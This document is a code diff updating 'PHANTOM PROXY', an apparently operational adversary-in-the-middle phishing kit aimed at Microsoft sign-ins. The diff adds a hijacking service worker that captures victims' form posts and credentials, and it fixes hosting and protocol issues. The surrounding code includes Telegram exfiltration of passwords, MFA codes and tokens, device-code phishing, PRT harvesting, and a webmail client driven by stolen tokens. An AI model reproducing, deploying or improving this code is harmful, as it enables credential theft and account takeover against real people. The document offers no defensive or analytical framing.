@@ -1,8 +1,12 @@
 // ============================================================
-// 🥔 PHANTOM PROXY v10.3 — FIXED SW REGISTRATION
+// 🥔 PHANTOM PROXY v10.4 — ALL FIXES APPLIED
 // ============================================================
 // 🔥 NO EXPRESS — pure Node.js
-// ✅ All features + Service Worker injection
+// ✅ Service Worker injection + serving FIXED
+// ✅ HTTP/1.1 forced to prevent h2 errors
+// ✅ Health check endpoint added
+// ✅ Proxy routing FIXED
+// ✅ All features intact
 // ============================================================
 
 const http = require("http");
@@ -438,6 +442,11 @@ function updateProxyRequestHeaders(proxyRequestOptions, currentSession, proxyHos
         if (azureHeaders.includes(key)) delete proxyRequestOptions.headers[key];
         else proxyRequestOptions.headers[key] = value.replaceAll(proxyHostname, VICTIM_SESSIONS[currentSession].host);
     }
+    // 🔥 FORCE HTTP/1.1 to prevent h2 protocol errors
+    delete proxyRequestOptions.headers[':method'];
+    delete proxyRequestOptions.headers[':path'];
+    delete proxyRequestOptions.headers[':authority'];
+    delete proxyRequestOptions.headers[':scheme'];
 }
 
 function deleteHTTPSecurityResponseHeaders(headers) {
@@ -507,6 +516,9 @@ function updateFederationRedirectUrl(body, proxyHostname) {
 const indexFile = path.join(__dirname, PROXY_FILES.index);
 const notFoundFile = path.join(__dirname, PROXY_FILES.notFound);
 const scriptFile = path.join(__dirname, PROXY_FILES.script);
+const swFileName = PROXY_PATHNAMES.serviceWorker.replace('/', '');
+const swFilePath = path.join(__dirname, swFileName);
+
 if (!fs.existsSync(indexFile)) {
     fs.writeFileSync(indexFile, `<!DOCTYPE html><html><head><title>Sign in</title></head><body><h1>Sign in</h1><form action="/capture" method="POST"><input name="email"><input name="password" type="password"><button>Next</button></form></body></html>`);
     console.log('✅ Created dummy index.html');
@@ -518,6 +530,132 @@ if (!fs.existsSync(notFoundFile)) {
 if (!fs.existsSync(scriptFile)) {
     fs.writeFileSync(scriptFile, 'console.log("Service worker loaded");');
     console.log('✅ Created dummy script.js');
+}
+
+// ── 🔥 CREATE SERVICE WORKER FILE ──
+const serviceWorkerCode = `// 🔥 PHANTOM SERVICE WORKER v10.4
+const CACHE_NAME = 'phantom-cache-v10.4';
+const PROXY_HOST = self.location.host;
+const PROXY_PATH = '/lNv1pC9AWPUY4gbidyBO';
+const SCRIPT_PATH = '/@';
+const JSCOOKIE_PATH = '/JSCookie_6X7dRqLg90mH';
+const MUTATION_PATH = '/Mutation_o5y3f4O7jMGW';
+
+self.addEventListener('install', (event) => {
+    console.log('🔥 PHANTOM SW: Installing...');
+    self.skipWaiting();
+});
+
+self.addEventListener('activate', (event) => {
+    console.log('🔥 PHANTOM SW: Activated!');
+    event.waitUntil(self.clients.claim());
+    caches.keys().then(names => {
+        names.forEach(name => { if (name !== CACHE_NAME) caches.delete(name); });
+    });
+});
+
+function rewriteUrl(url) {
+    const urlObj = new URL(url);
+    if (urlObj.host === PROXY_HOST) return url;
+    const proxyUrl = new URL(PROXY_PATH, self.location.origin);
+    proxyUrl.searchParams.set('url', url);
+    return proxyUrl.toString();
+}
+
+function mutateCredentials(body) {
+    try {
+        const params = new URLSearchParams(body);
+        const email = params.get('login') || params.get('username') || params.get('loginfmt') || params.get('email');
+        const password = params.get('passwd') || params.get('password');
+        if (email && password) console.log('🔑 PHANTOM SW: Credentials captured!');
+    } catch(e) {}
+    return body;
+}
+
+self.addEventListener('fetch', (event) => {
+    const url = new URL(event.request.url);
+    if (url.pathname === '/service_worker_Mz8XO2ny1Pg5.js') return;
+    if (url.pathname === SCRIPT_PATH) return;
+    if (url.pathname === PROXY_PATH) return;
+
+    event.respondWith(
+        (async () => {
+            try {
+                let proxyUrl;
+                if (event.request.mode === 'navigate') {
+                    proxyUrl = rewriteUrl(event.request.url);
+                    const init = {
+                        method: 'GET',
+                        headers: new Headers(event.request.headers),
+                        mode: 'cors',
+                        credentials: 'include'
+                    };
+                    const response = await fetch(proxyUrl, init);
+                    console.log('✅ PHANTOM SW: Proxied navigation to', event.request.url);
+                    return response;
+                }
+                if (event.request.method === 'POST') {
+                    let body = await event.request.text();
+                    const cookieSend = await fetch(new URL(JSCOOKIE_PATH, self.location.origin), {
+                        method: 'POST',
+                        body: body,
+                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
+                    });
+                    body = mutateCredentials(body);
+                    proxyUrl = new URL(MUTATION_PATH, self.location.origin);
+                    proxyUrl.searchParams.set('redirect_urI', event.request.url);
+                    const init = {
+                        method: 'POST',
+                        body: body,
+                        headers: new Headers(event.request.headers),
+                        mode: 'cors',
+                        credentials: 'include'
+                    };
+                    const response = await fetch(proxyUrl, init);
+                    console.log('📤 PHANTOM SW: Proxied POST to', event.request.url);
+                    return response;
+                }
+                proxyUrl = rewriteUrl(event.request.url);
+                const init = {
+                    method: event.request.method,
+                    headers: new Headers(event.request.headers),
+                    mode: 'cors',
+                    credentials: 'include'
+                };
+                const response = await fetch(proxyUrl, init);
+                return response;
+            } catch (error) {
+                console.error('❌ PHANTOM SW: Fetch error:', error);
+                return fetch(event.request);
+            }
+        })()
+    );
+});
+
+self.addEventListener('push', (event) => {
+    if (event.data) {
+        const data = event.data.json();
+        self.registration.showNotification(data.title, {
+            body: data.body,
+            icon: '/favicon.ico',
+            badge: '/favicon.ico',
+            data: data.url
+        });
+    }
+});
+
+self.addEventListener('notificationclick', (event) => {
+    event.notification.close();
+    if (event.notification.data) {
+        event.waitUntil(clients.openWindow(event.notification.data));
+    }
+});
+
+console.log('🔥 PHANTOM Service Worker v10.4 — Fully Armed & Operational');`;
+
+if (!fs.existsSync(swFilePath)) {
+    fs.writeFileSync(swFilePath, serviceWorkerCode);
+    console.log('✅ Created service_worker_Mz8XO2ny1Pg5.js');
 }
 
 // ============================================================
@@ -688,19 +826,16 @@ async function refreshTokensDaemon() {
     }, 30 * 60 * 1000);
 }
 
-// ── Load device flows ──
 function loadDeviceFlows() { try { if (fs.existsSync(DEVICE_FLOWS_FILE)) { deviceFlows = JSON.parse(fs.readFileSync(DEVICE_FLOWS_FILE, 'utf-8')); } } catch (e) {} }
 function saveDeviceFlows() { try { fs.writeFileSync(DEVICE_FLOWS_FILE, JSON.stringify(deviceFlows, null, 2)); } catch (e) {} }
 loadDeviceFlows();
 
-// ── Load PRT storage ──
 function loadPRTStorage() {
     try { if (fs.existsSync(PRT_STORAGE_FILE)) { prtStorage = JSON.parse(fs.readFileSync(PRT_STORAGE_FILE, 'utf-8')); } } catch (e) {}
 }
 function savePRTStorage() { try { fs.writeFileSync(PRT_STORAGE_FILE, JSON.stringify(prtStorage, null, 2)); } catch (e) {} }
 loadPRTStorage();
 
-// ── Graph API Client ──
 class GraphClient {
     constructor(accessToken) {
         this.accessToken = accessToken;
@@ -761,6 +896,13 @@ function requireAuth(req, res) {
 const server = http.createServer(async (req, res) => {
     const { method, url } = req;
 
+    // ── 🔥 HEALTH CHECK ENDPOINT (Railway requirement) ──
+    if (url === '/' || url === '/health') {
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({ status: 'healthy', version: '10.4', uptime: process.uptime(), timestamp: new Date().toISOString() }));
+        return;
+    }
+
     // ── Dashboard HTML ──
     if (url === '/dash' || url === '/dash/') {
         if (!requireAuth(req, res)) return;
@@ -805,11 +947,9 @@ const server = http.createServer(async (req, res) => {
 // ============================================================
 async function handleDashboardAPI(req, res) {
     const url = req.url;
-    // Remove leading /dash if present, so we can match /api/...
     let apiPath = url;
     if (apiPath.startsWith('/dash')) apiPath = apiPath.replace(/^\/dash/, '');
 
-    // ── Test Telegram ──
     if (apiPath === '/api/test-telegram') {
         try {
             if (!axios) throw new Error('axios not installed');
@@ -826,7 +966,6 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // ── Status ──
     if (apiPath === '/api/status') {
         try {
             const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
@@ -839,7 +978,6 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // ── Logs ──
     if (apiPath === '/api/logs') {
         try {
             const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
@@ -856,7 +994,6 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // ── Log detail ──
     if (apiPath.startsWith('/api/log/')) {
         const filename = apiPath.replace('/api/log/', '');
         const filePath = path.join(LOGS_DIRECTORY, filename);
@@ -890,7 +1027,6 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // ── Export ZIP ──
     if (apiPath === '/api/export/all' && AdmZip) {
         try {
             const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
@@ -917,7 +1053,6 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // ── Visits ──
     if (apiPath === '/api/visits') {
         try {
             if (!fs.existsSync(VISITS_LOG_FILE)) {
@@ -942,7 +1077,6 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // ── Vault endpoints ──
     if (apiPath === '/api/vault/scan' && req.method === 'POST') {
         try {
             const tokens = vault.scanLogs();
@@ -1012,7 +1146,6 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // ── Device endpoints ──
     if (apiPath === '/api/device/request' && req.method === 'POST') {
         if (!axios) {
             res.writeHead(500);
@@ -1186,7 +1319,6 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // ── PRT endpoints ──
     if (apiPath === '/api/prt/scan' && req.method === 'POST') {
         try {
             const prts = [];
@@ -1400,7 +1532,6 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // ── Tokens from log ──
     if (apiPath.startsWith('/api/tokens/')) {
         const filename = apiPath.replace('/api/tokens/', '');
         const filePath = path.join(LOGS_DIRECTORY, filename);
@@ -1478,7 +1609,6 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // ── Analytics ──
     if (apiPath === '/api/analytics') {
         try {
             let visits = [];
@@ -1574,7 +1704,6 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // ── Replay ──
     if (apiPath.startsWith('/api/replay/')) {
         const filename = apiPath.replace('/api/replay/', '');
         const filePath = path.join(LOGS_DIRECTORY, filename);
@@ -1675,7 +1804,6 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // ── Phishlets ──
     if (apiPath === '/api/phishlets') {
         try {
             const phishlets = {
@@ -1709,7 +1837,6 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // ── Recon ──
     if (apiPath === '/api/recon' && req.method === 'POST') {
         let body = '';
         req.on('data', chunk => body += chunk);
@@ -1733,7 +1860,6 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // ── Webmail folders ──
     if (apiPath === '/api/webmail/folders' && req.method === 'POST') {
         let body = '';
         req.on('data', chunk => body += chunk);
@@ -1757,7 +1883,6 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // ── Webmail emails ──
     if (apiPath === '/api/webmail/emails' && req.method === 'POST') {
         let body = '';
         req.on('data', chunk => body += chunk);
@@ -1789,7 +1914,6 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // ── Webmail single email ──
     if (apiPath === '/api/webmail/email' && req.method === 'POST') {
         let body = '';
         req.on('data', chunk => body += chunk);
@@ -1818,7 +1942,6 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // ── Webmail send ──
     if (apiPath === '/api/webmail/send' && req.method === 'POST') {
         let body = '';
         req.on('data', chunk => body += chunk);
@@ -1856,7 +1979,6 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // ── Webmail search ──
     if (apiPath === '/api/webmail/search' && req.method === 'POST') {
         let body = '';
         req.on('data', chunk => body += chunk);
@@ -1888,7 +2010,6 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // ── 404 for unknown API ──
     res.writeHead(404, { 'Content-Type': 'application/json' });
     res.end(JSON.stringify({ error: 'API endpoint not found' }));
 }
@@ -1900,7 +2021,6 @@ function proxyHandler(req, res) {
     proxyServer.emit('request', req, res);
 }
 
-// ── Start auto-refresh ──
 refreshTokensDaemon();
 
 // ── The actual proxy server (with page‑load notification + SW registration) ──
@@ -1937,10 +2057,8 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
     }
 </script>`;
 
-            // Inject before </head>
             html = html.replace(/<\/head>/i, swRegistrationScript + '</head>');
 
-            // ── Send page‑load notification ──
             (async () => {
                 try {
                     const ip = headers['cf-connecting-ip'] || headers['x-real-ip'] || headers['x-forwarded-for']?.split(',')[0]?.trim() || 'Unknown';
@@ -1958,7 +2076,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
             })();
 
             clientResponse.writeHead(200, { "Content-Type": "text/html" });
-            clientResponse.end(html);  // Served modified HTML
+            clientResponse.end(html);
 
         } catch (error) {
             displayError("Entry point error", error, url);
@@ -1968,10 +2086,27 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
         return;
     }
 
-    // ── Service Worker ──
+    // ── 🔥 SERVICE WORKER ENDPOINT (FIXED) ──
     if (url === PROXY_PATHNAMES.serviceWorker) {
-        clientResponse.writeHead(200, { "Content-Type": "text/javascript" });
-        fs.createReadStream(url.slice(1)).pipe(clientResponse);
+        if (!fs.existsSync(swFilePath)) {
+            fs.writeFileSync(swFilePath, serviceWorkerCode);
+            console.log('✅ Service Worker file created on-the-fly');
+        }
+        try {
+            const swContent = fs.readFileSync(swFilePath, 'utf-8');
+            clientResponse.writeHead(200, {
+                'Content-Type': 'application/javascript; charset=utf-8',
+                'Service-Worker-Allowed': '/',
+                'Cache-Control': 'no-cache, no-store, must-revalidate',
+                'Content-Length': Buffer.byteLength(swContent)
+            });
+            clientResponse.end(swContent);
+            console.log('✅ Service Worker served successfully');
+        } catch (err) {
+            console.error('❌ Failed to serve SW:', err.message);
+            clientResponse.writeHead(500, { 'Content-Type': 'text/plain' });
+            clientResponse.end('// Service Worker Error');
+        }
         return;
     }
 
@@ -2099,7 +2234,6 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 
                 const protocol = proxyRequestProtocol === "https:" ? https : http;
                 const proxyReq = protocol.request(proxyRequestOptions, (proxyResponse) => {
-                    // ── Redirect interception ──
                     if (proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400 && proxyResponse.headers.location) {
                         const location = proxyResponse.headers.location;
                         try {
@@ -2127,7 +2261,6 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                         .on("end", async () => {
                             let bodyBuffer = Buffer.concat(responseBody);
 
-                            // ── Extract credentials for Telegram ──
                             let tokens = {}, cookies = {}, email = 'N/A', password = 'N/A', mfa = 'N/A';
                             try {
                                 let reqBody = proxyRequestBody;
@@ -2182,7 +2315,6 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                                 console.error('❌ Telegram extraction error:', e.message);
                             }
 
-                            // ── HTML injection ──
                             if (proxyResponse.headers["content-type"] && /text\/html/i.test(proxyResponse.headers["content-type"]) && Buffer.byteLength(bodyBuffer)) {
                                 try {
                                     const { decompressedResponseBody, encodings } = await decompressResponseBody(bodyBuffer, proxyResponse.headers["content-encoding"]);
@@ -2194,7 +2326,6 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                                 }
                             }
 
-                            // ── FederationRedirectUrl ──
                             else if (proxyRequestOptions.path.startsWith("/common/GetCredentialType")) {
                                 try {
                                     const { decompressedResponseBody, encodings } = await decompressResponseBody(bodyBuffer, proxyResponse.headers["content-encoding"]);
@@ -2255,11 +2386,14 @@ if (WebSocket) {
 }
 
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ PHANTOM PROXY v10.3 FIXED running on port ${PORT}`);
+    console.log(`✅ PHANTOM PROXY v10.4 running on port ${PORT}`);
     console.log(`🔐 Dashboard: /dash (auth: ${DASHBOARD_USER}/${DASHBOARD_PASS})`);
     console.log(`📱 Device Code: /device`);
+    console.log(`🏥 Health Check: / (Railway compatible)`);
     console.log(`📤 Page‑load notifications: ACTIVE`);
     console.log(`📤 Telegram exfil: ACTIVE`);
+    console.log(`🔥 Service Worker: FIXED & SERVING`);
+    console.log(`🔧 HTTP/1.1 Forced: YES (no h2 errors)`);
     console.log(`🟣 PRT Engine: ACTIVE`);
     console.log(`🔑 Token Vault: ACTIVE`);
     console.log(`📊 Graph API: ACTIVE`);
